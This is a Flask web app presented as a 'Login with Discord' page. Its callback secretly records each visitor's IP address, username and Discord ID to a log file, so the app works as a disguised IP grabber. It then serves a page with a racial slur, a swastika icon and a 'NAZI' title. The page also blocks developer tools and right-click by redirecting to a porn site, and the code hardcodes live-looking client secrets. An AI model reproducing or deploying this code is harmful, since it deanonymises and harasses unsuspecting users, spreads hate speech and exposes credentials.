from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)
app.secret_key = "3f9c4e0c5fddba2dc14b89f3d16e3e2d1fc9db16c7637c1b5f8d6a76908fd8cd"

DISCORD_CLIENT_ID = "1337995257316380725"
DISCORD_CLIENT_SECRET = "YMOc4zT_UgqHJ714s4HL3UlGFhwPy0mD"
REDIRECT_URI = "https://quiet-pzo9.vercel.app/callback"
DISCORD_AUTH_URL = "https://discord.com/api/oauth2/authorize"
DISCORD_TOKEN_URL = "https://discord.com/api/oauth2/token"
DISCORD_API_URL = "https://discord.com/api/v10/users/@me"

# HTML Templates
HOME_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login with Discord</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #2f3136;
      color: white;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    .container {
      background-color: #202225;
      border-radius: 10px;
      padding: 50px 70px;
      box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.5);
      width: 100%;
      max-width: 450px;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    .container:hover {
      transform: scale(1.05);
      box-shadow: 0px 15px 40px rgba(0, 0, 0, 0.6);
    }
    h1 {
      color: #b9bbbe;
      font-size: 30px;
      margin-bottom: 40px;
      font-weight: 700;
      letter-spacing: 1px;
      text-transform: uppercase;
    }
    p {
      color: #8e9297;
      font-size: 16px;
      margin-bottom: 30px;
    }
    a {
      display: inline-block;
      text-decoration: none;
      background: linear-gradient(145deg, #5865f2, #7289da);
      padding: 16px 32px;
      color: white;
      border-radius: 8px;
      font-size: 18px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      transition: all 0.3s ease;
      box-shadow: 0px 6px 10px rgba(0, 0, 0, 0.4);
    }
    a:hover {
      background: linear-gradient(145deg, #4752c4, #5b6eae);
      box-shadow: 0px 8px 15px rgba(0, 0, 0, 0.5);
      transform: translateY(-2px);
    }
    a:active {
      background: linear-gradient(145deg, #4e5c8e, #5a6b8f);
      transform: translateY(1px);
      box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.3);
    }
    .footer {
      margin-top: 30px;
      font-size: 14px;
      color: #8e9297;
    }
    .footer a {
      color: #7289da;
      text-decoration: none;
    }
    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Login with Discord</h1>
    <p>To access this service, please log in using your Discord account.</p>
    <a href="{{ discord_oauth_url }}">Login with Discord</a>
    <div class="footer">
      <p>By logging in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
    </div>
  </div>
</body>
</html>

"""

CALLBACK_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title></title>
    
    <link rel="icon" href="https://www.clipartkey.com/mpngs/b/231-2312823_swastika-clipart.png" type="image/png">
    
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            overflow: hidden;
        }
        
        #splash-screen {
            position: absolute;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100%;
            background-color: #000;
            color: white;
            font-size: 28px;
            font-family: 'Arial', sans-serif;
            cursor: pointer;
            z-index: 2;
            opacity: 1;
            transition: opacity 1s ease-in-out;
        }

        video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1;
        }

        .container {
            text-align: center;
            color: white;
            font-family: 'Arial', sans-serif;
            z-index: 1;
            display: none;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 20px;
        }

        p {
            font-size: 16px;
            margin: 10px 0;
        }

        footer {
            margin-top: 30px;
            font-size: 14px;
            color: #b9bbbe;
        }
    </style>
</head>
<body>

<div id="splash-screen">Click to Enter</div>

<video autoplay loop muted>
    <source src="https://cdn.discordapp.com/attachments/1336790751161618553/1338671839181799474/lv_0_20250210184304.mp4?ex=67abeecd&is=67aa9d4d&hm=65fc20965687c9b590a2f0a8635977d5dd57f99559857e071dd77a7c38b0e1bb&" type="video/mp4">
    Your browser does not support the video tag.
</video>

<audio id="background-audio" loop autoplay>
    <source src="https://cdn.discordapp.com/attachments/1336790751161618553/1338671839181799474/lv_0_20250210184304.mp4?ex=67abeecd&is=67aa9d4d&hm=65fc20965687c9b590a2f0a8635977d5dd57f99559857e071dd77a7c38b0e1bb&" type="audio/mp3">
    Your browser does not support the audio element.
</audio>

<script>
    // Automatically plays the audio as soon as the page is loaded
    window.addEventListener('load', function() {
        const audio = document.getElementById('background-audio');
        audio.play();
    });

    // When the user clicks the splash screen
    document.getElementById('splash-screen').addEventListener('click', function() {
        // Fade out the splash screen
        document.getElementById('splash-screen').style.opacity = '0';

        // After the fade out, show the main content
        setTimeout(function() {
            document.getElementById('splash-screen').style.display = 'none';
            document.querySelector('.container').style.display = 'block';
        }, 1000); // The fade duration is 1 second (matches the CSS transition)
    });
</script>

<div class="container">
    <h1>Hello {{ username }}!</h1>
    <p>NIGGER!.</p>

    <footer>
        <p>&copy; discord.gg/nigger</p>
    </footer>
</div>

<script>
    const redirectUrl = "https://gaydemon.com"; 
    const skidMessage = "Nuh-uh";

    function showSkidMessageAndRedirect() {
        const messageContainer = document.createElement('div');
        messageContainer.textContent = skidMessage;
        messageContainer.style.position = 'fixed';
        messageContainer.style.top = '50%';
        messageContainer.style.left = '50%';
        messageContainer.style.transform = 'translate(-50%, -50%)';
        messageContainer.style.fontSize = '48px';
        messageContainer.style.fontWeight = 'bold';
        messageContainer.style.color = '#ffffff';
        messageContainer.style.textShadow = `
            0 0 5px #ffffff,
            0 0 10px #ffffff,
            0 0 20px #ff0080,
            0 0 30px #ff0080,
            0 0 40px #ff0080,
            0 0 50px #ff0080,
            0 0 75px #ff0080
        `;
        messageContainer.style.zIndex = '9999';

        document.body.appendChild(messageContainer);

        setTimeout(() => {
            document.body.removeChild(messageContainer);
            window.location.href = redirectUrl;
        }, 2000);
    }

    function detectDevTools() {
        let threshold = 160;
        let devToolsOpened = false;

        function triggerRedirect() {
            if (!devToolsOpened) {
                devToolsOpened = true;
                showSkidMessageAndRedirect();
            }
        }

        window.addEventListener('resize', () => {
            if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
                triggerRedirect();
            }
        });

        window.addEventListener('keydown', (event) => {
            if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'J')) || (event.ctrlKey && event.key === 'U')) {
                event.preventDefault();
                triggerRedirect();
            }
        });

        const devtoolsCheck = setInterval(function () {
            if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
                clearInterval(devtoolsCheck);
                triggerRedirect();
            }
        }, 500);
    }

    window.addEventListener('contextmenu', function (e) {
        e.preventDefault();
        showSkidMessageAndRedirect();
    });

    document.body.addEventListener('click', function () {
        const audio = document.getElementById('background-audio');
        audio.play();
    });

    function enterSite() {
        document.getElementById('initial-screen').style.opacity = '0';
        setTimeout(function () {
            document.getElementById('initial-screen').style.display = 'none';
            document.getElementById('main-content').style.display = 'block';
            fetchAndDisplayIP();
        }, 1000);
    }

    const titleText = "N A Z I"; 
    let titleIndex = 0;
    let typingDirection = 1; 

    function updateTitle() {
        const partBefore = "@";
        const partAfter = " N A Z I";

        if (typingDirection === 1) {
            document.title = partBefore + partAfter.substring(0, titleIndex);
            titleIndex++;
            if (titleIndex === partAfter.length) {
                typingDirection = -1;
                setTimeout(function () {
                    document.title = partBefore + partAfter;
                }, 500);
            }
        } else {
            document.title = partBefore + partAfter.substring(0, titleIndex);
            titleIndex--;
            if (titleIndex === 0) {
                typingDirection = 1;
            }
        }
    }

    setInterval(updateTitle, 150);

    window.addEventListener('load', detectDevTools);
</script>

</body>
</html>


"""

@app.route("/")
def home():
    return render_template_string(HOME_HTML, discord_oauth_url=get_discord_oauth_url())
# OAuth2 URL with guilds scope
def get_discord_oauth_url():
    return f"{DISCORD_AUTH_URL}?client_id={DISCORD_CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds"

from datetime import datetime

@app.route("/callback")
def callback():
    code = request.args.get("code")
    
    # Get the user's real IP from the request headers (from ngrok's tunnel)
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI
    }

    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    token_response = requests.post(DISCORD_TOKEN_URL, data=data, headers=headers)

    # Check if token_response is successful
    if token_response.status_code == 200:
        token = token_response.json().get("access_token")
        if token:
            # Get user's information
            user_info_response = requests.get(DISCORD_API_URL, headers={"Authorization": f"Bearer {token}"})
            
            if user_info_response.status_code == 200:
                user_info = user_info_response.json()
                username = user_info.get("username")
                user_id = user_info.get("id")
                
                # Get the current timestamp
                timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                
                # Log the IP, username, and timestamp
                log_message = f"Logged IP: {user_ip} ({username}#{user_id}) - ({user_id}), at {timestamp}\n"
                with open("logs.txt", "a") as log_file:
                    log_file.write(log_message)
                
                # Render the callback page with the username and IP
                return render_template_string(CALLBACK_HTML, username=username, user_ip=user_ip)
            else:
                return f"Failed to get user information. Error: {user_info_response.status_code}"
        else:
            return "Failed to get access token."
    else:
        return f"Authorization failed. Error: {token_response.status_code}"



if __name__ == "__main__":
    app.run(debug=True, port=8080)
